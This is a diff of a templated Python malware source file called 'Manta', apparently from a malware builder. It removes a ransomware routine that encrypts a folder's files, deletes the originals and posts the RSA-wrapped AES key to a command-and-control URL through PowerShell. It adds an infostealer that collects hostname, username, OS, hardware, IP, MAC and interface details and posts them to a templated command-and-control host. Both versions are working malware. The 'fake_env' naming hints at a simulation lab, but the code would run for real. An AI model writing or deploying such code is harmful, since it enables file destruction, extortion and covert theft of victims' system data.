@@ -1,132 +1,83 @@
 {#---
 name: Manta
-malware_type: Infostealer
+malware_type: infostealer
 lang: python
-description: | 
-Manta is an infostealer that targets hardware informations, OS informations etc.
-It is not used to exfiltrate documents, but more to exfiltrate environnement informations to either : 
-- Sell them and get money over the stolen data
-- Prepare and weaponize correctly for attacking a specific target while using a relatively discret malware before using the heavy infantry
+description: >
+  Manta is an infostealer that targets basic system, hardware, and network information.
+  It is not used to exfiltrate documents or credentials.
 ---#}
 
+{% set start = "start_manta" %}
+
 # --- IMPORTS ---
-import os
-import requests
-import sys
-import random
-import string
-import shutil
+import platform
 import socket
-import datetime
-import subprocess
+import getpass
+import uuid
+import psutil
 import json
-from pathlib import Path
-from Crypto.Cipher import AES
-from Crypto.Cipher import PKCS1_OAEP
-from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad
-from Crypto.PublicKey import RSA
-import base64
+import requests
+import os
+import time
+import sys
 
 # --- CONFIGURATION ---
-C2_URL = "{{ c2_url }}"
-FOLDER_PATH = r"{{ folder_path }}"
-RSA_KEY = "{{ rsa_key_b64 }}"
-EXTENSION = "{{ file_extension }}"
+C2_URL_MANTA = "{{ c2_url_manta }}"
 
+def get_system_info():
+    info = {}
 
-# --- LOGIQUE ---
-# --- bloc_resolve_path ---
-def resolve_path(path_str):
-  expanded = os.path.expandvars(path_str)  # Remplace %USERPROFILE%, etc.
-  expanded = os.path.expanduser(expanded)  # Remplace ~
-  return Path(expanded)
+    # --- Système ---
+    info['malware_id'] = "1887509308309418244605469339184520403722"
+    info['hostname'] = socket.gethostname()
+    info['username'] = getpass.getuser()
+    info['platform'] = platform.system()
+    info['platform-release'] = platform.release()
+    info['platform-version'] = platform.version()
+    info['architecture'] = platform.architecture()[0]
+    info['uptime_seconds'] = time.time() - psutil.boot_time()
 
-# --- bloc_generate_aes_key ---
-def generate_aes_key():
-  return get_random_bytes(32)
+    # --- Matériel ---
+    info['cpu'] = platform.processor()
+    info['cores_logical'] = psutil.cpu_count()
+    info['cores_physical'] = psutil.cpu_count(logical=False)
+    info['ram_total_MB'] = round(psutil.virtual_memory().total / (1024 * 1024), 2)
 
+    # --- Réseau ---
+    try:
+        info['ip_address'] = socket.gethostbyname(socket.gethostname())
+    except:
+        info['ip_address'] = "N/A"
 
-# --- bloc_list_files_in_fake_env ---
-def list_files_in_fake_env(fake_root):
-  if not fake_root.exists():
-      return None
-  files = []
-  for foldername, subfolders, filenames in os.walk(fake_root):
-      for filename in filenames:
-          file_path = Path(foldername) / filename
-          files.append(file_path)
-  return files
+    try:
+        info['mac_address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
+                                        for ele in range(0, 8 * 6, 8)][::-1])
+    except:
+        info['mac_address'] = "N/A"
 
+    net_info = {}
+    for interface, addrs in psutil.net_if_addrs().items():
+        net_info[interface] = [addr.address for addr in addrs if addr.family == socket.AF_INET]
+    info['network_interfaces'] = net_info
 
-# --- bloc_encrypt_file ---
-def encrypt_file(file_path, key):
-  with open(file_path, 'rb') as f:
-      file_data = f.read()
-  cipher = AES.new(key, AES.MODE_CBC)
-  ct_bytes = cipher.encrypt(pad(file_data, AES.block_size))
-  encrypted_file_path = file_path.with_suffix(file_path.suffix + '.{{ file_extension }}')
-  with open(encrypted_file_path, 'wb') as f:
-      f.write(cipher.iv)
-      f.write(ct_bytes)
-  os.remove(file_path)
+    return info
 
+def exfiltrate(data):
+    try:
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(C2_URL_MANTA, data=json.dumps(data), headers=headers, timeout=5)
+        return response.status_code
+    except Exception as e:
+        return f"Exfiltration error: {e}"
 
-# --- bloc_encrypt_fake_env_files ---
-def encrypt_fake_env_files():
-  fake_root = resolve_path("{{ folder_path }}")
-  if not fake_root.exists():
-      return
-  aes_key = generate_aes_key()
-  send_aes_key_to_c2(aes_key)
-  files_to_encrypt = list_files_in_fake_env(fake_root)
-  if not files_to_encrypt:
-      return
-  for file_path in files_to_encrypt:
-      encrypt_file(file_path, aes_key)
+def main():
+    system_data = get_system_info()
+    result = exfiltrate(system_data)
+    # Optionnel : log local ou debug
+    # print(result)
 
-
-# --- bloc_send_aes_key_to_c2 ---
-def send_aes_key_to_c2(key):
-  public_key = load_rsa_public_key()
-  encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
-  c2_url = "{{ c2_url }}"
-  hostname = socket.gethostname()
-  timestamp = datetime.datetime.now().isoformat()
-  payload = {
-      "aes_key": encrypted_aes_key.hex(),
-      "hostname": hostname,
-      "timestamp": timestamp
-  }
-  json_payload = json.dumps(payload)
-  powershell_command = f'''
-Invoke-RestMethod -Uri "{c2_url}" -Method Post -Body '{json_payload}' -ContentType "application/json"
-'''
-  try:
-      subprocess.run(
-          ["powershell", "-Command", powershell_command],
-          capture_output=True,
-          text=True,
-          timeout=10
-      )
-  except Exception:
-      pass
-
-
-# --- bloc_load_rsa_public_key ---
-def load_rsa_public_key():
-  b64_key = "{{ rsa_key_b64 }}"
-  der_key = base64.b64decode(b64_key)
-  return RSA.import_key(der_key)
-
-
-# --- bloc_encrypt_aes_key_with_rsa ---
-def encrypt_aes_key_with_rsa(aes_key, public_key):
-    cipher_rsa = PKCS1_OAEP.new(public_key)
-    return cipher_rsa.encrypt(aes_key)
-
-
-# --- bloc_main ---
-if __name__ == "__main__":
-    encrypt_fake_env_files()
-
+def start_manta():
+    system_data = get_system_info()
+    result = exfiltrate(system_data)
+    # Optionnel : log local ou debug
+    # print(result)
